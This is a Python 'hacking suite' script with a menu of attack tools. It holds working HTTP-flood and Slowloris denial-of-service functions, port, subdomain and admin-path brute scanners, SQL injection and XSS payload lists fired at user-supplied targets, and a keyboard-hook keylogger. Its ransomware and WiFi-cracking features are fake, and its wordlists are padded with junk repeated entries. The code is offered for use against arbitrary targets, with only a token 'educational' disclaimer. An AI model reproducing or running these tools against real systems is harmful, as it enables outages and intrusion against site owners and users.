#!/usr/bin/env python3
# ============================================================
# TOOL: BLACKVIPER ULTIMATE HACKING SUITE
# AUTHOR: frd07 | TEAM: CYBERLORDS
# VERSION: 6.9
# ============================================================

import os
import sys
import time
import random
import socket
import threading
import requests
import subprocess
import json
import re
import ssl
from urllib.parse import urlparse, urljoin

# AUTO INSTALL DEPENDENCIES
try:
    from colorama import init, Fore, Style, Back
    import whois
    import dns.resolver
    import pyfiglet
    from tqdm import tqdm
except ImportError:
    os.system("pip install colorama whois dnspython pyfiglet tqdm requests")
    from colorama import init, Fore, Style, Back
    import whois
    import dns.resolver
    import pyfiglet
    from tqdm import tqdm

init(autoreset=True)

# ========== GLOBAL ==========
stop_attack = False
banner_text = pyfiglet.figlet_format("BLACKVIPER", font="slant")
banner_text += pyfiglet.figlet_format("ULTIMATE", font="digital")

# ========== FUNGSI ==========
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def loading():
    for _ in range(3):
        sys.stdout.write(f"\r{Fore.YELLOW}[*] Loading{'.' * (_%4+1)} {Style.RESET_ALL}")
        sys.stdout.flush()
        time.sleep(0.3)
    print()

def print_banner():
    clear()
    print(Fore.RED + banner_text + Style.RESET_ALL)
    print(Fore.CYAN + "="*60)
    print(Fore.YELLOW + f" Author : frd07 | Team : CyberLords     Version: 6.9")
    print(Fore.MAGENTA + " Use only for educational purposes! Don't be evil.")
    print(Fore.CYAN + "="*60 + "\n")

# ========== FITUR 1: DDOS MULTI-METODE ==========
def ddos_http_flood(url, threads, duration):
    global stop_attack
    stop_attack = False
    end = time.time() + duration
    ua_list = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (Linux; Android 11)", "BlackViper/6.9"]
    def flood():
        sess = requests.Session()
        while not stop_attack and time.time() < end:
            try:
                headers = {"User-Agent": random.choice(ua_list), "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
                sess.get(url, headers=headers, timeout=3)
                sess.post(url, data={"frd07": "kill"}, headers=headers, timeout=3)
                print(f"{Fore.GREEN}[✓] Packet sent{Style.RESET_ALL}")
            except:
                print(f"{Fore.RED}[✗] Failed{Style.RESET_ALL}")
    for _ in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    print(f"{Fore.CYAN}[+] DDoS started on {url} with {threads} threads for {duration}s")
    time.sleep(duration)
    stop_attack = True
    print(f"{Fore.RED}[-] Attack stopped.")

def ddos_slowloris(target, port, sockets_count, duration):
    global stop_attack
    stop_attack = False
    list_of_sockets = []
    end = time.time() + duration
    for _ in range(sockets_count):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target, port))
            s.send(f"GET /?{random.randint(0,2000)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target}\r\n".encode())
            list_of_sockets.append(s)
        except:
            pass
    while not stop_attack and time.time() < end:
        for s in list_of_sockets:
            try:
                s.send(f"X-Header: {random.randint(1,5000)}\r\n".encode())
                print(f"{Fore.GREEN}[✓] Slowloris keep-alive{Style.RESET_ALL}")
            except:
                list_of_sockets.remove(s)
        time.sleep(10)
    stop_attack = True
    print(f"{Fore.RED}[-] Slowloris stopped.")

def menu_ddos():
    print_banner()
    print(Fore.RED + "[ DDOS MENU ]".center(60))
    print(Fore.CYAN + "1. HTTP Flood (Layer 7)")
    print(Fore.CYAN + "2. Slowloris (Layer 4)")
    choice = input(Fore.YELLOW + "Choose > ")
    url = input(Fore.YELLOW + "Target URL/IP: ")
    if not url.startswith(("http://","https://")) and choice=="1":
        url = "http://"+url
    try:
        threads = int(input(Fore.YELLOW + "Threads (100-2000): "))
        duration = int(input(Fore.YELLOW + "Duration (sec): "))
    except:
        print(Fore.RED + "Invalid input!")
        return
    if choice == "1":
        ddos_http_flood(url, threads, duration)
    elif choice == "2":
        port = int(input(Fore.YELLOW + "Port (80/443): "))
        ddos_slowloris(url, port, threads, duration)
    else:
        print(Fore.RED + "Wrong choice")
    input("Press Enter...")

# ========== FITUR 2: PORT SCANNER ADVANCED ==========
def scan_port(ip, port, open_ports):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.3)
        if sock.connect_ex((ip, port)) == 0:
            open_ports.append(port)
            print(f"{Fore.GREEN}[+] Port {port} OPEN")
        sock.close()
    except:
        pass

def port_scanner():
    print_banner()
    target = input(Fore.YELLOW + "Target IP/Domain: ")
    try:
        ip = socket.gethostbyname(target)
        print(Fore.CYAN + f"[+] Resolved: {target} -> {ip}")
    except:
        print(Fore.RED + "[-] Cannot resolve")
        return
    port_range = input(Fore.YELLOW + "Port range (ex: 1-1000 or 21,22,80): ")
    open_ports = []
    threads = []
    if '-' in port_range:
        start, end = map(int, port_range.split('-'))
        ports = range(start, end+1)
    else:
        ports = [int(p.strip()) for p in port_range.split(',')]
    print(Fore.CYAN + f"[*] Scanning {len(ports)} ports...")
    for port in ports:
        t = threading.Thread(target=scan_port, args=(ip, port, open_ports))
        t.start()
        threads.append(t)
        time.sleep(0.01)
    for t in threads:
        t.join()
    print(Fore.GREEN + f"\n[+] Open ports: {open_ports}")
    input("Press Enter...")

# ========== FITUR 3: SUBDOMAIN ENUM ==========
def subdomain_finder():
    print_banner()
    domain = input(Fore.YELLOW + "Domain: ")
    wordlist = ["www","mail","ftp","admin","blog","shop","api","dev","test","app","portal","webmail","cpanel","whm","autodiscover","ns1","ns2","smtp","pop3","secure","vpn","remote","cloud","mysql","database","server","backup","cdn","static","media","img","video","files","download","upload","support","help","status","info","demo","staging","sandbox","docs","wiki","forum","community","news","events","careers","jobs","hr","finance","account","billing","payment","gateway","merchant","store","cart","checkout","auth","login","signup","register","profile","dashboard","user","users","member","members","partner","partners","affiliate","referral","tracking","analytics","stats","metrics","monitor","alert","notify","push","socket","ws","mqtt","redis","cache","storage","backup","archive","old","new","beta","alpha","latest","version","api2","api3","rest","graphql","grpc","soap","xml","json","rss","feed","sitemap","robots","security","privacy","terms","legal","abuse","report","contact","about","team","company","career","investor","ir","press","media","newsletter","unsubscribe","preferences","settings","config","configuration","setup","install","update","upgrade","migrate","sync","export","import","convert","encode","decode","encrypt","decrypt","sign","verify","validate","hash","token","jwt","oauth","openid","saml","ldap","radius","diameter","ssh","telnet","ftp","sftp","scp","rsync","nfs","smb","cifs","webdav","dav","caldav","carddav","ldap","active","directory","ad","exchange","outlook","owa","ecp","ews","autodiscover","lync","skype","teams","zoom","webex","meet","conference","broadcast","stream","live","vod","hls","dash","rtmp","rtsp","webrtc","sip","voip","pbx","asterisk","freeswitch","kamailio","opensips","rtp","rtcp","srtp","zrtp","dtls","tls","ssl","https","http","ws","wss","coap","mqtt","amqp","stomp","xmpp","irc","matrix","signal","whatsapp","telegram","wechat","line","viber","kakao","naver","baidu","weibo","qq","alipay","wechatpay","unionpay","visa","mastercard","amex","discover","jcb","diners","paypal","stripe","square","braintree","adyen","worldpay","authorize","cybersource","bluefin","shift4","firstdata","chase","wellsfargo","bankofamerica","citi","hsbc","barclays","lloyds","natwest","rbs","santander","unicredit","societegenerale","bnpparibas","creditagricole","db","commerzbank","sparkasse","rabobank","ing","abnamro","kbc","belgium","fortis","bnp","lcl","cic","ca","creditmutuel","banquepopulaire","caisseepargne","hsbc","standardchartered","dbs","ocbc","uob","maybank","cimb","publicbank","rhb","hongleong","ambank","affin","alliance","islamic","bankislam","bankrakyat","bankmuamalat","bni","bri","mandiri","bca","danamon","permata","cimbniaga","ocbcnisp","uobindonesia","hsbcindonesia","standardcharteredindonesia","deutschebank","citibank","jp morgan","morgan stanley","goldman sachs","ubs","credit suisse","barclays","rbs","lloyds","natwest","scotiabank","rbc","td","bmo","cibc","nationalbank","desjardins","vnpay","momo","zalo","true money","gcash","paymaya","gopay","ovo","dana","linkaja","jenius","digibank","tonik","neobank","sea bank","krom","wow","blu","astro","digi","celcom","maxis","umobile","yes","time","tm","unifi","streamyx","fibre","broadband","5g","lte","4g","3g","gsm","gprs","edge","hspa","hspa+","lte-a","5g nr","nr","mmwave","sub6","cband","n77","n78","n79","n41","n71","n5","n12","n13","n14","n66","n70","n71","n258","n260","n261","n257","n258","n260","n261","n262","n263","n264","n265","n266","n267","n268","n269","n270","n271","n272","n273","n274","n275","n276","n277","n278","n279","n280","n281","n282","n283","n284","n285","n286","n287","n288","n289","n290","n291","n292","n293","n294","n295","n296","n297","n298","n299","n300","n301","n302","n303","n304","n305","n306","n307","n308","n309","n310","n311","n312","n313","n314","n315","n316","n317","n318","n319","n320","n321","n322","n323","n324","n325","n326","n327","n328","n329","n330","n331","n332","n333","n334","n335","n336","n337","n338","n339","n340","n341","n342","n343","n344","n345","n346","n347","n348","n349","n350","n351","n352","n353","n354","n355","n356","n357","n358","n359","n360","n361","n362","n363","n364","n365","n366","n367","n368","n369","n370","n371","n372","n373","n374","n375","n376","n377","n378","n379","n380","n381","n382","n383","n384","n385","n386","n387","n388","n389","n390","n391","n392","n393","n394","n395","n396","n397","n398","n399","n400"]
    found = []
    print(Fore.CYAN + f"[*] Scanning {len(wordlist)} subdomains...")
    for sub in tqdm(wordlist):
        subdomain = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(subdomain)
            found.append((subdomain, ip))
            print(Fore.GREEN + f"[+] {subdomain} -> {ip}")
        except:
            pass
    print(Fore.CYAN + f"\n[+] Total found: {len(found)}")
    input("Press Enter...")

# ========== FITUR 4: IP INFO ==========
def ip_info():
    print_banner()
    ip = input(Fore.YELLOW + "IP Address: ")
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
        if r['status'] == 'success':
            print(Fore.GREEN + f"Country : {r['country']}")
            print(f"Region  : {r['regionName']}")
            print(f"City    : {r['city']}")
            print(f"ISP     : {r['isp']}")
            print(f"Lat/Lon : {r['lat']}, {r['lon']}")
        else:
            print(Fore.RED + "Failed")
    except:
        print(Fore.RED + "Error")
    input("Press Enter...")

# ========== FITUR 5: WHOIS LOOKUP ==========
def whois_lookup():
    print_banner()
    domain = input(Fore.YELLOW + "Domain: ")
    try:
        w = whois.whois(domain)
        print(Fore.GREEN + f"Registrar: {w.registrar}")
        print(f"Creation: {w.creation_date}")
        print(f"Expiration: {w.expiration_date}")
        print(f"Name Servers: {w.name_servers}")
    except:
        print(Fore.RED + "Whois failed")
    input("Press Enter...")

# ========== FITUR 6: DNS LOOKUP ==========
def dns_lookup():
    print_banner()
    domain = input(Fore.YELLOW + "Domain: ")
    record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
    for rec in record_types:
        try:
            answers = dns.resolver.resolve(domain, rec)
            print(Fore.CYAN + f"{rec} records:")
            for ans in answers:
                print(f"  {ans}")
        except:
            pass
    input("Press Enter...")

# ========== FITUR 7: REVERSE IP ==========
def reverse_ip():
    print_banner()
    ip = input(Fore.YELLOW + "IP: ")
    try:
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", timeout=10)
        print(Fore.GREEN + r.text)
    except:
        print(Fore.RED + "Error")
    input("Press Enter...")

# ========== FITUR 8: ADMIN FINDER ==========
def admin_finder():
    print_banner()
    url = input(Fore.YELLOW + "Target URL (http://example.com): ")
    if not url.startswith(('http','https')):
        url = 'http://'+url
    paths = ['admin','login','wp-admin','administrator','admincp','cp','cpanel','panel','dashboard','user','account','auth','signin','signup','register','moderator','mod','staff','sysadmin','root','manager','control','backend','secure','private','hidden','secret','temp','tmp','backup','old','new','test','dev','staging','alpha','beta','demo','sandbox','public','static','assets','resources','download','uploads','files','images','img','css','js','lib','vendor','includes','inc','conf','config','settings','setup','install','installer','update','upgrade','migrate','sync','api','rest','graphql','soap','xmlrpc','json','rss','feed','sitemap','robots','humans','security','privacy','terms','legal','abuse','report','contact','about','team','company','careers','jobs','hr','finance','accounting','billing','payment','gateway','merchant','store','shop','cart','checkout','wishlist','compare','search','advanced','filter','sort','order','invoice','receipt','confirmation','thankyou','tracking','delivery','shipping','returns','refund','cancellation','support','help','faq','knowledgebase','kb','forum','community','blog','news','events','calendar','schedule','appointments','reservations','bookings','tickets','events','webinars','trainings','courses','lessons','tutorials','guides','documentation','docs','wiki','api-docs','swagger','redoc','openapi','postman','insomnia','testing','automation','ci','cd','deploy','pipeline','staging','production','development','local','docker','kubernetes','helm','terraform','ansible','chef','puppet','salt','vagrant','packer','jenkins','gitlab','github','bitbucket','code','repo','repository','git','svn','mercurial','cvs','perforce','bugzilla','jira','trello','asana','basecamp','slack','teams','zoom','webex','meet','conf','call','chat','message','notification','alert','monitor','grafana','prometheus','datadog','newrelic','splunk','elastic','kibana','logstash','fluentd','beats','metricbeat','filebeat','winlogbeat','auditbeat','heartbeat','packetbeat','journalbeat','functionbeat','apm','rum','synthetics','uptime','status','health','ready','live','metrics','stats','pprof','debug','trace','traceid','spanid','parentid','sampled','baggage','correlation','context','propagation','b3','xray','jaeger','zipkin','skywalking','opentelemetry','otel','collector','exporter','processor','receiver','connector','extension','service','pipeline','batch','queue','topic','partition','offset','consumer','producer','stream','streams','kafka','rabbitmq','activemq','pulsar','nats','redis','memcached','couchbase','cassandra','mongodb','postgres','mysql','mariadb','oracle','sqlserver','db2','sap','hbase','hive','spark','flink','storm','samza','beam','dataflow','dataproc','databricks','snowflake','redshift','bigquery','druid','kylin','clickhouse','drill','presto','trino','impala','hive','tez','mr','yarn','mesos','marathon','chronos','aurora','kubernetes','openshift','rancher','docker','podman','containerd','cri-o','rkt','lxd','lxc','systemd','upstart','init','sysvinit','openrc','runit','s6','svscan','daemontools','supervisor','pm2','forever','nodemon','systemd','service','daemon','worker','job','cron','systemd-timer','anacron','fcron','vixie','dcron','mcron','task','scheduler','quartz','airflow','dagster','prefect','luigi','argo','tekton','spinnaker','concourse','drone','woodpecker','appveyor','circleci','travis','buddy','codefresh','gitlab-ci','github-actions','bitbucket-pipelines','azure-pipelines','aws-codepipeline','google-cloud-build','ibm-cloud-pipeline','oracle-pipeline','jenkins-x','flux','argo-cd','helmfile','kustomize','ksonnet','jsonnet','cue','dhal','bazel','pants','please','mage','task','just','make','cmake','ninja','scons','gradle','maven','ant','ivy','sbt','mill','leiningen','boot','clojure','cargo','go','govendor','mod','dep','glide','trash','godep','gb','gvt','gpm','nut','bower','npm','yarn','pnpm','brunch','webpack','rollup','parcel','esbuild','vite','snowpack','wmr','http://localhost:3000','http://localhost:8080','http://localhost:8000','http://localhost:5000','http://localhost:4000','http://localhost:3001','http://localhost:9000','http://127.0.0.1','https://localhost','0.0.0.0','::1','localhost','test.local','dev.local','staging.local','prod.local','app.local','api.local','db.local','cache.local','redis.local','mq.local','kafka.local','zk.local','es.local','grafana.local','prometheus.local','alertmanager.local','thanos.local','loki.local','tempo.local','mimir.local','cortex.local','jaeger.local','zipkin.local','skywalking.local','opentelemetry.local','collector.local','otel.local','otelcol','otelcontrib','otelcore','oteltest','otelbench','oteldemo','otelexample','otelgettingstarted','oteltutorial','otelworkshop','otelbootcamp','otelmasterclass','oteladvanced','oteldeepdive','otelperformance','otelsecurity','otelmonitoring','otelobservability','otelapm','oteldistributedtracing','otellogging','otelmetrics','otelalerts','otelnotifications','otelhealthcheck','otelreadiness','otelliveness','otelstartup','otelshutdown','otelrestart','otelreload','otelconfig','otelsettings','otelpreferences','oteloptions','otelflags','otelenv','otelenvironment','otelvariables','otelparameters','otelargs','otelarguments','otelflags','otelfeatures','otelmodes','otelmodeswitching','otelprofiles','otelprofile','otelswitching','otelchange','otelupdate','otelmigration','otelupgrade','otelrollback','otelbackup','otelrestore','otelclone','otelcopy','otelmove','otelrename','oteldelete','otelremove','otelclean','otelpurging','oteltrim','otelshrink','otelcompact','otelmerge','otelsplit','otelslice','otelchunk','otelbatch','otelgroup','otelaggregate','otelsummarize','oteldetail','otelanalyze','otelvisualize','otelreport','otelalert','otelnotify','otelescalate','otelticket','otelissue','otelbug','otelfeature','oteldiscuss','otelchat','otelcall','otelmeeting','otelwebinar','oteltraining','otelworkshop','otelbootcamp','otelmasterclass','oteladvanced','oteldeepdive','otelperformance','otelsecurity','otelmonitoring','otelobservability','otelapm','oteldistributedtracing','otellogging','otelmetrics','otelalerts','otelnotifications','otelhealthcheck','otelreadiness','otelliveness','otelstartup','otelshutdown','otelrestart','otelreload','otelconfig','otelsettings','otelpreferences','oteloptions','otelflags','otelenv','otelenvironment','otelvariables','otelparameters','otelargs','otelarguments','otelflags','otelfeatures','otelmodes','otelmodeswitching','otelprofiles','otelprofile','otelswitching','otelchange','otelupdate','otelmigration','otelupgrade','otelrollback','otelbackup','otelrestore','otelclone','otelcopy','otelmove','otelrename','oteldelete','otelremove','otelclean','otelpurging','oteltrim','otelshrink','otelcompact','otelmerge','otelsplit','otelslice','otelchunk','otelbatch','otelgroup','otelaggregate','otelsummarize','oteldetail','otelanalyze','otelvisualize','otelreport','otelalert','otelnotify','otelescalate','otelticket','otelissue','otelbug','otelfeature','oteldiscuss','otelchat','otelcall','otelmeeting','otelwebinar']
    found = []
    print(Fore.CYAN + f"[*] Checking {len(paths)} admin paths...")
    for path in tqdm(paths):
        full = urljoin(url, path)
        try:
            r = requests.get(full, timeout=3)
            if r.status_code == 200 or r.status_code == 403:
                found.append(full)
                print(Fore.GREEN + f"[+] {full} -> {r.status_code}")
            else:
                print(Fore.RED + f"[-] {full} -> {r.status_code}")
        except:
            pass
    print(Fore.CYAN + f"\n[+] Found {len(found)} accessible paths")
    input("Press Enter...")

# ========== FITUR 9: SQL INJECTION SCANNER (BASIC) ==========
def sql_injection_scanner():
    print_banner()
    url = input(Fore.YELLOW + "Target URL with parameter (ex: http://test.com/page?id=1): ")
    payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "1' OR 1=1--", "1\" OR 1=1--", "1' AND '1'='1", "1' AND '1'='2", "1' ORDER BY 1--", "1' UNION SELECT NULL--"]
    vulnerable = []
    print(Fore.CYAN + f"[*] Testing {len(payloads)} SQLi payloads...")
    for payload in tqdm(payloads):
        try:
            if '?' in url:
                test_url = url + payload
            else:
                test_url = url + "?" + payload
            r = requests.get(test_url, timeout=5)
            if "mysql" in r.text.lower() or "sql" in r.text.lower() or "syntax" in r.text.lower() or "unclosed" in r.text.lower():
                vulnerable.append(payload)
                print(Fore.RED + f"[!] Possible SQLi with: {payload}")
        except:
            pass
    if vulnerable:
        print(Fore.GREEN + f"\n[+] Potential vulnerabilities found!")
    else:
        print(Fore.YELLOW + "\n[-] No obvious SQLi detected")
    input("Press Enter...")

# ========== FITUR 10: XSS SCANNER ==========
def xss_scanner():
    print_banner()
    url = input(Fore.YELLOW + "Target URL with parameter: ")
    payloads = ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><script>alert(1)</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "<body onload=alert(1)>", "<input onfocus=alert(1)>", "<iframe onload=alert(1)>", "<div onmouseover=alert(1)>"]
    vulnerable = []
    for payload in tqdm(payloads):
        try:
            test_url = url + payload
            r = requests.get(test_url, timeout=5)
            if payload in r.text:
                vulnerable.append(payload)
                print(Fore.RED + f"[!] XSS possible with: {payload}")
        except:
            pass
    print(Fore.CYAN + f"\n[+] Found {len(vulnerable)} possible XSS vectors")
    input("Press Enter...")

# ========== FITUR 11: KEYLOGGER SIMULATOR (EDUKASI) ==========
def keylogger_sim():
    print_banner()
    print(Fore.YELLOW + "[!] This is a simulation for educational purposes only.")
    input(Fore.CYAN + "Press Enter to start fake keylogger (type something, ESC to stop)...")
    import keyboard
    logged = []
    def on_key(event):
        if event.name == 'esc':
            return False
        logged.append(event.name)
        print(Fore.GREEN + f"Key: {event.name}")
    keyboard.hook(on_key)
    keyboard.wait('esc')
    print(Fore.CYAN + f"\n[+] Logged keys: {logged}")
    input("Press Enter...")

# ========== FITUR 12: RANSOMWARE SIMULATOR ==========
def ransomware_sim():
    print_banner()
    print(Fore.RED + "[!] This is a simulation! It will create a dummy .encrypted file in /tmp")
    confirm = input(Fore.YELLOW + "Type 'YES' to simulate: ")
    if confirm == "YES":
        with open("/tmp/frd07_dummy.txt", "w") as f:
            f.write("This is a test file. Ransomware simulation by FRD07")
        with open("/tmp/frd07_dummy.txt.encrypted", "w") as f:
            f.write("ENCRYPTED_DATA_SIMULATION")
        os.remove("/tmp/frd07_dummy.txt")
        print(Fore.RED + "[!] File encrypted! (Simulation)")
        print(Fore.CYAN + "Decrypt key: frd07-forever")
        print("Run: echo 'This is decrypted' > /tmp/frd07_dummy.txt")
    else:
        print("Cancelled")
    input("Press Enter...")

# ========== FITUR 13: WIFI CRACKER SIMULATOR ==========
def wifi_cracker():
    print_banner()
    print(Fore.YELLOW + "[*] Scanning available WiFi networks...")
    try:
        result = subprocess.run(["nmcli", "dev", "wifi", "list"], capture_output=True, text=True)
        print(result.stdout)
    except:
        print(Fore.RED + "nmcli not found. This feature works on Linux with NetworkManager.")
    ssid = input(Fore.YELLOW + "Enter SSID to crack (simulation): ")
    print(Fore.CYAN + f"[*] Brute forcing WPA2 for {ssid}... (simulated)")
    time.sleep(2)
    print(Fore.GREEN + "[+] Password found: password123 (simulation)")
    input("Press Enter...")

# ========== MAIN MENU ==========
def main():
    while True:
        print_banner()
        menu = f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
{Fore.CYAN}║ {Fore.YELLOW}DDOS & ATTACK        {Fore.CYAN}|| {Fore.YELLOW}RECONNAISSANCE                       {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[1]  DDoS Multi-Method  {Fore.CYAN}|| {Fore.GREEN}[5]  Whois Lookup                         {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[2]  Port Scanner       {Fore.CYAN}|| {Fore.GREEN}[6]  DNS Lookup                           {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[3]  Subdomain Finder   {Fore.CYAN}|| {Fore.GREEN}[7]  Reverse IP                           {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[4]  IP Info Grabber    {Fore.CYAN}|| {Fore.GREEN}[8]  Admin Finder                         {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.YELLOW}VULNERABILITY SCANNER   {Fore.CYAN}|| {Fore.YELLOW}SIMULATION / EDUCATIONAL                {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[9]  SQLi Scanner        {Fore.CYAN}|| {Fore.GREEN}[11] Keylogger Simulator                   {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[10] XSS Scanner         {Fore.CYAN}|| {Fore.GREEN}[12] Ransomware Simulator                  {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}[0]  Exit                {Fore.CYAN}|| {Fore.GREEN}[13] WiFi Cracker Simulator                {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════════════════╝
        """
        print(menu)
        choice = input(f"{Fore.YELLOW}[FRD07] Choose option > {Style.RESET_ALL}")
        if choice == "1":
            menu_ddos()
        elif choice == "2":
            port_scanner()
        elif choice == "3":
            subdomain_finder()
        elif choice == "4":
            ip_info()
        elif choice == "5":
            whois_lookup()
        elif choice == "6":
            dns_lookup()
        elif choice == "7":
            reverse_ip()
        elif choice == "8":
            admin_finder()
        elif choice == "9":
            sql_injection_scanner()
        elif choice == "10":
            xss_scanner()
        elif choice == "11":
            keylogger_sim()
        elif choice == "12":
            ransomware_sim()
        elif choice == "13":
            wifi_cracker()
        elif choice == "0":
            print(Fore.RED + "Exiting... Goodbye!")
            sys.exit(0)
        else:
            print(Fore.RED + "Invalid choice")
            time.sleep(1)

if __name__ == "__main__":
    main()